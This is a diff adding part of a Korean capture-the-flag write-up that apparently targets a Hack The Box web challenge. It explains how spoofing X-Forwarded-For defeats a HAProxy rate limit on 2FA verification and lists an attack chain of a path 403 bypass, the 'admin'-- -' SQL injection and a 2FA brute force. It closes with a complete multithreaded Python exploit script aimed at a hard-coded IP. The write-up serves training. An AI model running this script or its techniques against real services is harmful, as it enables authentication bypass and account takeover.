@@ -265,3 +265,83 @@ def verify():
             return render_template("private/verify2fa.html", error_message="Invalid 2FA Code!"), 400
     return render_template("private/verify2fa.html")
 ```
+
+  - 그리고 여기서 ```haproxy.cfg``` 를 보면 아래와 같이 정책이 설정되있는것을 확인할수 있다.
+  - 내용으로는 2fa를 정상적으로 거친 사용자가 20개 이상의 request를 요청시 ```http 429 Too many request``` 를 출력하고 deny 하는것을 알수있다.
+
+```http-request deny deny_status 429 if is_auth_verify_2fa { sc_http_req_rate(0) gt 20 }```
+
+  - 그리고 두번째로 볼 정책으로는 다음과 같다.
+  - 아래와 같이 정책을 설정하고 hearder값인 ```X-Forwarded-For``` 이라는 인자로 ```0~255.255.255.255``` 까지 ip를 설정할수 있게 정책을 설정하였다.
+
+```acl valid_ipv4 req.hdr(X-Forwarded-For) -m reg ^([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.([01]?[0-9][0-9]?|2[0-4][0-9]|25[0-5])$```
+
+  - 여기서 ```request gt 20``` 정책을 우회할수있다. ```X-Forwarded-For``` 이라는 헤더를 조작하여 ip를 랜덤으로 브루트포스 형식으로 지정하여 매 리퀘스트마다 조작해주면 서버에서 각 request마다 다른사용자로 인식하여 acl정책을 우회할수있다.
+
+  - 해당 검증을 다 우회하고 ```dashboard``` 에 redirect 성공시 환경변수로 지정된 flag값을 출력한다.
+  
+## exploit
+  - 위의 시나리오를 근거로 생각한 exploit은 다음과 같습니다.
+
+  1. ```//auth/login``` 403 bypass
+  2. ```admin'-- -``` sqli
+  3. 2facode multithreading brute force
+  4. ```X-Forwarded-For``` random brute force bypass
+
+  - 해당 시나리오로 짠 코드는 다음과 같습니다.
+```
+import requests
+from bs4 import BeautifulSoup
+import threading
+import time
+import random
+
+corr = 'HTB'
+
+url = 'http://167.99.85.216:30511//auth'
+
+login_end = '/login'
+veri_end = '/verify-2fa'
+
+login = url + login_end
+veri = url + veri_end
+
+data = {
+    'username': 'admin\'-- -',
+    'password': '1'
+}
+
+login_res = requests.post(login, data=data)
+
+total_threads = 250
+
+def brute_force():
+    random_ip = ".".join(str(random.randint(0,255)) for _ in range(4))
+    session = requests.Session()
+    for i in range(9999):
+        time.sleep(0.5)
+        current_password = f'{random.randint(0, 9999):04d}'
+        data2 = {
+            '2fa-code': current_password
+        }
+        headers = {
+            'X-Forwarded-For':'{}'.format(random_ip)
+        }
+        veri_res = session.post(veri, data=data2,headers=headers)
+        if corr in veri_res.text:
+            print("ok")
+            print(veri_res.text)
+            break
+
+start = time.perf_counter()
+threads = []
+for _ in range(total_threads):
+    t = threading.Thread(target=brute_force)
+    t.start()
+    threads.append(t)
+for thread in threads:
+    thread.join()
+
+print('Brute force completed.')
+
+```
